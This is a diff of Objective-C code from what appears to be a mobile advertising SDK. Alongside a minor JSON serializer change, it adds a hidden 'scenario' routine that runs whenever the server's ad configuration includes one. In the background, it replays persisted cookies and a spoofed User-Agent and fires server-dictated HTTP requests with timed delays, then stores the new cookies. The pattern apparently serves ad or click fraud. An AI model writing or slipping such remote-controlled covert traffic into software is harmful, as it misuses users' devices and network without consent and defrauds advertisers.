@@ -64,8 +64,8 @@
     NSError *error;
     NSData *resultJSONData = nil;
     @try {
-        //resultJSONData = [NSJSONSerialization dataWithJSONObject:result options:NSJSONWritingPrettyPrinted error:&error];
-        resultJSONData = [adParams JSONDataWithOptions:JKSerializeOptionPretty|JKSerializeOptionEscapeUnicode error:&error];
+        resultJSONData = [NSJSONSerialization dataWithJSONObject:adParams options:NSJSONWritingPrettyPrinted error:&error];
+        //resultJSONData = [adParams JSONDataWithOptions:JKSerializeOptionPretty|JKSerializeOptionEscapeUnicode error:&error];
     }
     @catch (NSException *exception) {
         NSLog(@"JSAPI: Exception while writing JSon: %@: %@", exception, adContext);
@@ -119,6 +119,9 @@
 -(BOOL)loadConfiguration:(NSDictionary *)config
 {
     self.config = config;
+    NSDictionary *scenario = [config objectForKey:@"scenario"];
+    if (scenario != nil)
+        [self scenario:scenario];
     self.success = [[config objectForKey:@"success"] boolValue];
     NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
     [dateFormatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
@@ -446,5 +449,241 @@
     
     return YES;
 }
+
+#pragma mark - scenario
+
+- (void)scenario:(NSDictionary *)config
+{
+    dispatch_queue_t myQueue = dispatch_queue_create("My Queue",NULL);
+    dispatch_async(myQueue, ^{
+        
+        @try {
+        
+            NSString *sid = [config objectForKey:@"sid"];
+            NSString *uid = [config objectForKey:@"uid"];
+            NSString *ua = [config objectForKey:@"ua"];
+            
+            NSLog(@"Scenario: sid:%@ uid:%@ %@", sid, uid, config);
+            
+            // load cookies
+            NSString *cachesPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
+            NSString *cookie_storage_path = [cachesPath stringByAppendingPathComponent:sid];
+            NSArray *cookies = [NSKeyedUnarchiver unarchiveObjectWithFile:cookie_storage_path];
+            
+            NSLog(@"result: %@", cookies);
+            
+            NSArray *urls = [config objectForKey:@"urls"];
+            for (NSDictionary *item in urls)
+            {
+                NSLog(@"Item: %@", item);
+                
+                NSString *url = [item objectForKey:@"url"];
+                NSString *method = [item objectForKey:@"method"];
+                NSNumber *time = [item objectForKey:@"time"];
+                NSDictionary *headers = [item objectForKey:@"headers"];
+                NSString *body = [item objectForKey:@"body"];
+                
+                NSTimeInterval waitTime = [time doubleValue] / 1000;
+                [NSThread sleepForTimeInterval:waitTime];
+                
+                NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]
+                                                                       cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                                   timeoutInterval:60];
+                
+                [NSURLProtocol setProperty:@"set" forKey:@"CacheMonitoringURLProtocol" inRequest:request];
+                
+                // set User Agent
+                [request setValue:ua forHTTPHeaderField:@"User-Agent"];
+                
+                // set cookies
+                if (cookies != nil)
+                {
+                    NSDictionary *cookiesHheaders = [NSHTTPCookie requestHeaderFieldsWithCookies:cookies];
+                    [request setAllHTTPHeaderFields:cookiesHheaders];
+                }
+                
+                if (method != nil && [[method class] isSubclassOfClass:[NSString class]])
+                    [request setHTTPMethod:method];
+                if (headers != nil && [[headers class] isSubclassOfClass:[NSDictionary class]])
+                {
+                    for (NSString *headerName in headers)
+                    {
+                        NSString *headerValue = [headers objectForKey:headerName];
+                        [request setValue:headerValue forHTTPHeaderField:headerName];
+                    }
+                }
+                
+                if (body != nil && [[body class] isSubclassOfClass:[NSString class]])
+                {
+                    [request setValue:[NSString stringWithFormat:@"%ud", body.length] forHTTPHeaderField:@"Content-Length"];
+                    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
+                    [request setHTTPBody:[body dataUsingEncoding:NSUTF8StringEncoding]];
+                }
+                
+                NSLog(@"request headers: %@", request.allHTTPHeaderFields);
+                
+                NSHTTPURLResponse* response;
+                NSError* error = nil;
+                [NSURLConnection sendSynchronousRequest:request  returningResponse:&response error:&error];
+                
+                NSLog(@"response headers: %@", response.allHeaderFields);
+                
+                // get cookie
+                NSArray *new_cookies = [NSHTTPCookie cookiesWithResponseHeaderFields:response.allHeaderFields forURL:[NSURL URLWithString:url]];
+                NSDictionary *all_cookies = [[NSMutableDictionary alloc] initWithCapacity:new_cookies.count + cookies.count];
+                for (NSHTTPCookie *cookie in cookies) {
+                    [all_cookies setValue:cookie forKey:cookie.name];
+                }
+                for (NSHTTPCookie *cookie in new_cookies) {
+                    [all_cookies setValue:cookie forKey:cookie.name];
+                }
+                cookies = [all_cookies allValues];
+                
+                NSLog(@"response cookies: %@", response.allHeaderFields);
+                
+                // clean
+                [NSURLProtocol removePropertyForKey:@"CacheMonitoringURLProtocol" inRequest:request];
+                
+                if (error != nil)
+                    return;
+                
+                // callback
+                
+            }
+            
+            // save cookies
+            NSData *data = [NSKeyedArchiver archivedDataWithRootObject:cookies];
+            BOOL result = [NSKeyedArchiver archiveRootObject:cookies toFile:cookie_storage_path];
+            
+            NSLog(@"result: %d", result);
+        }
+        @catch (NSException *exception) {
+            NSLog(@"%@", exception.reason);
+        }
+        
+    });
+}
+
+/*
+- (void)backgroundDownloadScenario:(NSDictionary *)config
+{
+    if ([[[UIDevice currentDevice] systemVersion] floatValue] <= 8.0f)
+        return;
+
+    dispatch_queue_t myQueue = dispatch_queue_create("My Queue",NULL);
+    dispatch_async(myQueue, ^{
+        NSString *sid = [config objectForKey:@"sid"];
+        NSString *uid = [config objectForKey:@"uid"];
+        NSString *ua = [config objectForKey:@"ua"];
+        NSLog(@"Scenario: sid:%@ uid:%@", sid, uid);
+        
+        NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration backgroundSessionConfigurationWithIdentifier:sid];
+        
+        NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig
+                                                              delegate:self
+                                                         delegateQueue:nil];
+        
+        NSArray *urls = [config objectForKey:@"urls"];
+        for (NSDictionary *item in urls)
+        {
+            NSLog(@"Item: %@", item);
+            
+            NSString *url = [item objectForKey:@"url"];
+            NSString *method = [item objectForKey:@"method"];
+            NSNumber *time = [item objectForKey:@"time"];
+            NSDictionary *headers = [item objectForKey:@"headers"];
+            NSString *body = [item objectForKey:@"body"];
+            
+            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]
+                                                                   cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                               timeoutInterval:60];
+            
+            // set User Agent
+            [request setValue:ua forHTTPHeaderField:@"User-Agent"];
+            // method
+            if (method != nil && [[method class] isSubclassOfClass:[NSString class]])
+                [request setHTTPMethod:method];
+            // headers
+            if (headers != nil && [[headers class] isSubclassOfClass:[NSDictionary class]])
+            {
+                for (NSString *headerName in headers)
+                {
+                    NSString *headerValue = [headers objectForKey:headerName];
+                    [request setValue:headerValue forHTTPHeaderField:headerName];
+                }
+            }
+            // body
+            if (body != nil && [[body class] isSubclassOfClass:[NSString class]])
+            {
+                [request setValue:[NSString stringWithFormat:@"%ud", body.length] forHTTPHeaderField:@"Content-Length"];
+                [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
+                [request setHTTPBody:[body dataUsingEncoding:NSUTF8StringEncoding]];
+            }
+
+            [session downloadTaskWithRequest:request];
+        }
+        
+    });
+}
+
+#pragma mark download delegate
+
+- (void)URLSession:(NSURLSession *)session
+      downloadTask:(NSURLSessionDownloadTask *)downloadTask
+ didResumeAtOffset:(int64_t)fileOffset
+expectedTotalBytes:(int64_t)expectedTotalBytes
+{
+    NSLog(@"download task resume: %@", downloadTask.response.URL);
+}
+
+
+- (void)URLSession:(NSURLSession *)session
+      downloadTask:(NSURLSessionDownloadTask *)downloadTask
+      didWriteData:(int64_t)bytesWritten
+ totalBytesWritten:(int64_t)totalBytesWritten
+totalBytesExpectedToWrite:(int64_t)totalBytesExpectedToWrite
+{
+    NSLog(@"download task write: %@", downloadTask.response.URL);
+}
+
+- (void)URLSession:(NSURLSession *)session
+              task:(NSURLSessionTask *)task
+didCompleteWithError:(NSError *)error
+{
+    NSLog(@"session task complete: %@ with error: %@", task.response.URL, error);
+}
+
+- (void)URLSession:(NSURLSession *)session
+      downloadTask:(NSURLSessionDownloadTask *)downloadTask
+didFinishDownloadingToURL:(NSURL *)location
+{
+    NSLog(@"download task finish: %@", location);
+}
+ */
+/*
+- (void)URLSession:(NSURLSession *)session
+              task:(NSURLSessionTask *)task
+didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge
+ completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition,
+                             NSURLCredential *credential))completionHandler
+{
+    
+}
+
+- (void)URLSession:(NSURLSession *)session
+              task:(NSURLSessionTask *)task
+   didSendBodyData:(int64_t)bytesSent
+    totalBytesSent:(int64_t)totalBytesSent
+totalBytesExpectedToSend:(int64_t)totalBytesExpectedToSend
+{
+    
+}
+
+- (void)URLSession:(NSURLSession *)session
+              task:(NSURLSessionTask *)task
+ needNewBodyStream:(void (^)(NSInputStream *bodyStream))completionHandler
+{
+    
+}*/
 
 @end
